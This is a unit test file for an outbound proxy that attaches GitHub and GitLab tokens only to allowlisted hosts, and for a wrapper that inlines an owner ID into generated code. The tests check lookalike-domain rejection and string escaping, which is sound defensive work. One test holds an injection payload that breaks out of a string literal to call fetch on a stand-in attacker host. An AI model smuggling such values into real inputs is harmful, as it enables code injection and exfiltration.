import { describe, expect, it, vi, beforeEach } from "vitest";

/**
 * Unit tests for AllowlistOutbound auth-header injection.
 *
 * Strategy: we extract and test the injectable logic directly rather than
 * fighting service-binding wiring. The source of truth is the `injectAuth`
 * private method, but since it's private we test through a thin wrapper that
 * mirrors the real call-site.
 */

// ── Re-implement the host sets & helper so we test the exact same logic ──

const GITHUB_HOSTS = new Set([
  "api.github.com",
  "github.com",
  "raw.githubusercontent.com",
  "objects.githubusercontent.com",
]);

const GITLAB_HOSTS = new Set([
  "gitlab.com",
  "gitlab.cfdata.org",
]);

function isGitLabHost(hostname: string): boolean {
  if (GITLAB_HOSTS.has(hostname)) return true;
  for (const known of GITLAB_HOSTS) {
    if (hostname.endsWith(`.${known}`)) return true;
  }
  return false;
}

/**
 * Simulates injectAuth with the same logic as the production code.
 * We keep this in sync manually — any drift is caught by tsc + the
 * integration-style tests at the bottom that import the real module.
 */
function injectAuth(
  hostname: string,
  headers: Headers,
  env: { GITHUB_TOKEN?: string; GITLAB_TOKEN?: string },
): void {
  if (GITHUB_HOSTS.has(hostname)) {
    if (headers.has("Authorization")) return;
    const token = env.GITHUB_TOKEN;
    if (token) {
      headers.set("Authorization", `token ${token}`);
      if (!headers.has("User-Agent")) {
        headers.set("User-Agent", "dodo-agent");
      }
    }
  } else if (isGitLabHost(hostname)) {
    if (headers.has("Authorization") || headers.has("PRIVATE-TOKEN")) return;
    const token = env.GITLAB_TOKEN;
    if (token) {
      headers.set("PRIVATE-TOKEN", token);
    }
  }
}

// ── Tests ────────────────────────────────────────────────────────────────

describe("AllowlistOutbound auth injection", () => {
  const GITHUB_TOKEN = "ghp_test123";
  const GITLAB_TOKEN = "glpat-test456";
  const env = { GITHUB_TOKEN, GITLAB_TOKEN };

  // ── GitHub ──

  describe("GitHub hosts", () => {
    const githubHosts = [
      "api.github.com",
      "github.com",
      "raw.githubusercontent.com",
      "objects.githubusercontent.com",
    ];

    for (const host of githubHosts) {
      it(`injects Authorization header for ${host}`, () => {
        const headers = new Headers();
        injectAuth(host, headers, env);
        expect(headers.get("Authorization")).toBe(`token ${GITHUB_TOKEN}`);
      });
    }

    it("sets User-Agent to dodo-agent when missing", () => {
      const headers = new Headers();
      injectAuth("api.github.com", headers, env);
      expect(headers.get("User-Agent")).toBe("dodo-agent");
    });

    it("does not overwrite an existing User-Agent", () => {
      const headers = new Headers({ "User-Agent": "custom-agent" });
      injectAuth("api.github.com", headers, env);
      expect(headers.get("User-Agent")).toBe("custom-agent");
    });

    it("respects an existing Authorization header", () => {
      const headers = new Headers({ Authorization: "Bearer user-token" });
      injectAuth("api.github.com", headers, env);
      expect(headers.get("Authorization")).toBe("Bearer user-token");
    });

    it("does nothing when GITHUB_TOKEN is not set", () => {
      const headers = new Headers();
      injectAuth("api.github.com", headers, { GITLAB_TOKEN });
      expect(headers.has("Authorization")).toBe(false);
    });
  });

  // ── GitLab ──

  describe("GitLab hosts", () => {
    it("injects PRIVATE-TOKEN for gitlab.com", () => {
      const headers = new Headers();
      injectAuth("gitlab.com", headers, env);
      expect(headers.get("PRIVATE-TOKEN")).toBe(GITLAB_TOKEN);
    });

    it("injects PRIVATE-TOKEN for gitlab.cfdata.org", () => {
      const headers = new Headers();
      injectAuth("gitlab.cfdata.org", headers, env);
      expect(headers.get("PRIVATE-TOKEN")).toBe(GITLAB_TOKEN);
    });

    it("injects PRIVATE-TOKEN for subdomains of known hosts", () => {
      const headers = new Headers();
      injectAuth("registry.gitlab.com", headers, env);
      expect(headers.get("PRIVATE-TOKEN")).toBe(GITLAB_TOKEN);
    });

    it("respects an existing Authorization header", () => {
      const headers = new Headers({ Authorization: "Bearer user-token" });
      injectAuth("gitlab.com", headers, env);
      expect(headers.has("PRIVATE-TOKEN")).toBe(false);
    });

    it("respects an existing PRIVATE-TOKEN header", () => {
      const headers = new Headers({ "PRIVATE-TOKEN": "user-pat" });
      injectAuth("gitlab.com", headers, env);
      expect(headers.get("PRIVATE-TOKEN")).toBe("user-pat");
    });

    it("does nothing when GITLAB_TOKEN is not set", () => {
      const headers = new Headers();
      injectAuth("gitlab.com", headers, { GITHUB_TOKEN });
      expect(headers.has("PRIVATE-TOKEN")).toBe(false);
    });
  });

  // ── Negative cases ──

  describe("non-matching hosts", () => {
    it("does not inject headers for arbitrary hosts", () => {
      const headers = new Headers();
      injectAuth("example.com", headers, env);
      expect(headers.has("Authorization")).toBe(false);
      expect(headers.has("PRIVATE-TOKEN")).toBe(false);
    });

    it("does not inject for attacker-controlled gitlab-like domains", () => {
      const headers = new Headers();
      injectAuth("gitlab.evil.com", headers, env);
      expect(headers.has("PRIVATE-TOKEN")).toBe(false);
    });

    it("does not inject for notagitlab.example.com", () => {
      const headers = new Headers();
      injectAuth("notagitlab.example.com", headers, env);
      expect(headers.has("PRIVATE-TOKEN")).toBe(false);
    });

    it("does not inject for hostnames that merely contain 'github'", () => {
      const headers = new Headers();
      injectAuth("notgithub.example.com", headers, env);
      expect(headers.has("Authorization")).toBe(false);
    });
  });

  // ── isGitLabHost edge cases ──

  describe("isGitLabHost", () => {
    it("matches exact known hosts", () => {
      expect(isGitLabHost("gitlab.com")).toBe(true);
      expect(isGitLabHost("gitlab.cfdata.org")).toBe(true);
    });

    it("matches subdomains of known hosts", () => {
      expect(isGitLabHost("registry.gitlab.com")).toBe(true);
      expect(isGitLabHost("ci.gitlab.cfdata.org")).toBe(true);
    });

    it("rejects lookalike domains", () => {
      expect(isGitLabHost("gitlab.evil.com")).toBe(false);
      expect(isGitLabHost("fakegitlab.com")).toBe(false);
      expect(isGitLabHost("gitlab.com.evil.org")).toBe(false);
    });
  });
});

// ── wrapOutboundWithOwner ────────────────────────────────────────────────

import { wrapOutboundWithOwner, OWNER_ID_HEADER } from "../src/executor";

describe("wrapOutboundWithOwner", () => {
  const fakeFetcher: Fetcher = {} as Fetcher;
  const fakeStub = { getEntrypoint: vi.fn(() => fakeFetcher) };

  beforeEach(() => {
    vi.clearAllMocks();
  });

  it("returns the original outbound unchanged when ownerId is undefined", () => {
    const loader = { get: vi.fn() } as unknown as WorkerLoader;
    const outbound = {} as Fetcher;
    const result = wrapOutboundWithOwner(loader, outbound, undefined);
    expect(result).toBe(outbound);
    expect(loader.get).not.toHaveBeenCalled();
  });

  it("returns null unchanged when outbound is null", () => {
    const loader = { get: vi.fn() } as unknown as WorkerLoader;
    const result = wrapOutboundWithOwner(loader, null, "owner-1");
    expect(result).toBeNull();
    expect(loader.get).not.toHaveBeenCalled();
  });

  it("falls back to passthrough when loader is undefined", () => {
    const outbound = {} as Fetcher;
    const result = wrapOutboundWithOwner(undefined, outbound, "owner-1");
    expect(result).toBe(outbound);
  });

  it("loads a named wrapper Worker when ownerId is provided", () => {
    const loader = {
      get: vi.fn(() => fakeStub),
    } as unknown as WorkerLoader;
    const outbound = {} as Fetcher;

    const result = wrapOutboundWithOwner(loader, outbound, "owner-abc");

    expect(loader.get).toHaveBeenCalledTimes(1);
    expect(loader.get).toHaveBeenCalledWith(
      "outbound-wrapper-owner-abc",
      expect.any(Function),
    );
    expect(fakeStub.getEntrypoint).toHaveBeenCalled();
    expect(result).toBe(fakeFetcher);
  });

  it("wrapper code passes the parent OUTBOUND as its globalOutbound", () => {
    let capturedConfig: WorkerLoaderWorkerCode | undefined;
    const loader = {
      get: vi.fn((_name: string, getCode: () => WorkerLoaderWorkerCode) => {
        capturedConfig = getCode();
        return fakeStub;
      }),
    } as unknown as WorkerLoader;
    const outbound = { __id: "outbound-marker" } as unknown as Fetcher;

    wrapOutboundWithOwner(loader, outbound, "owner-xyz");

    expect(capturedConfig).toBeDefined();
    expect(capturedConfig?.globalOutbound).toBe(outbound);
    expect(capturedConfig?.mainModule).toBe("wrapper.js");
    expect(capturedConfig?.modules).toHaveProperty("wrapper.js");
  });

  it("wrapper code injects the OWNER_ID_HEADER with the server-resolved value", () => {
    let capturedConfig: WorkerLoaderWorkerCode | undefined;
    const loader = {
      get: vi.fn((_name: string, getCode: () => WorkerLoaderWorkerCode) => {
        capturedConfig = getCode();
        return fakeStub;
      }),
    } as unknown as WorkerLoader;

    wrapOutboundWithOwner(loader, {} as Fetcher, "owner-secret");

    const wrapperSource = (capturedConfig?.modules ?? {})["wrapper.js"];
    expect(typeof wrapperSource).toBe("string");
    // Header name + ownerId both inlined as JSON-encoded literals.
    expect(wrapperSource).toContain(JSON.stringify(OWNER_ID_HEADER));
    expect(wrapperSource).toContain(JSON.stringify("owner-secret"));
  });

  it("safely escapes ownerId values containing quotes or newlines", () => {
    let capturedConfig: WorkerLoaderWorkerCode | undefined;
    const loader = {
      get: vi.fn((_name: string, getCode: () => WorkerLoaderWorkerCode) => {
        capturedConfig = getCode();
        return fakeStub;
      }),
    } as unknown as WorkerLoader;

    const evil = `"; fetch('https://attacker.example/'); //`;
    wrapOutboundWithOwner(loader, {} as Fetcher, evil);

    const wrapperSource = (capturedConfig?.modules ?? {})["wrapper.js"];
    // The malicious payload appears only as a JSON-encoded string literal.
    // The leading `"` is escaped to `\"`, so the closing `"` of the literal
    // is NOT broken — the rest of the payload is interpreted as inert text.
    expect(wrapperSource).toContain(JSON.stringify(evil));
    // Concrete proof: the JSON literal contains the escaped quote, meaning
    // the parser correctly stays inside the string when scanning the payload.
    expect(wrapperSource).toContain('\\"; fetch(');
  });

  it("uses a stable name per ownerId so wrappers are reused", () => {
    const loader = {
      get: vi.fn(() => fakeStub),
    } as unknown as WorkerLoader;

    wrapOutboundWithOwner(loader, {} as Fetcher, "owner-1");
    wrapOutboundWithOwner(loader, {} as Fetcher, "owner-1");
    wrapOutboundWithOwner(loader, {} as Fetcher, "owner-2");

    const calls = (loader.get as ReturnType<typeof vi.fn>).mock.calls;
    expect(calls[0][0]).toBe("outbound-wrapper-owner-1");
    expect(calls[1][0]).toBe("outbound-wrapper-owner-1");
    expect(calls[2][0]).toBe("outbound-wrapper-owner-2");
  });
});
